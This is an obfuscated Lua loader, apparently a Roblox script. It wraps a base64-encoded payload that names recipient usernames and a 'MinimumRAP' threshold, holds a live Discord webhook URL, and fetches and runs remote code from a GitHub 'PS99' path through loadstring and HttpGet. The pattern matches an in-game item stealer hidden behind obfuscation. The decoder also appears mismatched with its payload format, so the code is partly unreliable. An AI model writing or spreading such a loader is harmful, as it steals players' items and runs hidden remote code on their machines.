
local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;

local function VMCall(ByteString, vmenv, ...)
  local DIP = 1;
  local repeatNext;
  ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
    if (Byte(byte, 2) == 81) then
      repeatNext = StrToNumber(Sub(byte, 1, 1));
      return "";
    else
      local a = Char(StrToNumber(byte, 16));
      if repeatNext then
        local b = Rep(a, repeatNext);
        repeatNext = nil;
        return b;
      else
        return a;
      end
    end
  end);
  
  local function gBits8()
    local a = Byte(ByteString, DIP, DIP);
    DIP = DIP + 1;
    return a;
  end
  
  local function gString(Len)
    local Str;
    if not Len then
      Len = gBits8();
      if (Len == 0) then
        return "";
      end
    end
    Str = Sub(ByteString, DIP, (DIP + Len) - 1);
    DIP = DIP + Len;
    return Str;
  end
  
  local function Deserialize()
    local Chunk = gString();
    return Chunk;
  end
  
  local function Wrap(Chunk, Env)
    return function(...)
      local func, err = loadstring(Chunk);
      if func then
        setfenv(func, Env);
        return func(...);
      else
        error("VM Error: " .. tostring(err));
      end
    end;
  end
  
  return Wrap(Deserialize(), vmenv)(...);
end

return VMCall("VXNlcm5hbWUgPSAic3Vpc3Vpc3VpMTIzNyIKVXNlcm5hbWUyID0gInN1aXN1aXN1aTEyMzciCk1pbmltdW1SQVAgPSAxCldlYmhvb2sgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjUxMjc0MjA4MDcwODczMC84MjdLSHdKaG5NUFFWQlNJNG1HUVMwbTIzeVV6SlBZamVTM2Uza041ZWFvekFuVjduRHUyTGp2QVQ4MnF3UVBMRld0OCIKCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veWVzbGlkZXp6L0VrczB2YS9tYWluL1BTOTkiKSkoKQ==", GetFEnv(), ...);
  